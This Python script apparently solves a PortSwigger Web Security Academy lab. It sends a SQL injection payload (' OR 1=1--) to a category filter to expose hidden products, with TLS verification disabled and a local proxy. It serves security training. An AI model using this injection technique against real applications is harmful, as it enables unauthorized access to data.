#!/usr/bin/python3
# Title: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
# Description: https://portswigger.net/web-security/sql-injection
# Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
# The results in the SQL query: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
# Example: python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--"

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"} #proxies

def exploit_sqli(url, payload):
    uri = "/filter?category="
    r = requests.get(url+uri+payload, verify=False,proxies=proxies)
    if "Robot Home Security Buddy" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        output.info("Usage: %s <url> <payload>" % sys.argv[0])
        output.info('Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    if exploit_sqli(url, payload):
        output.success("SQL Injection successful!")
    else:
        output.error("SQL Injection unsuccessful!")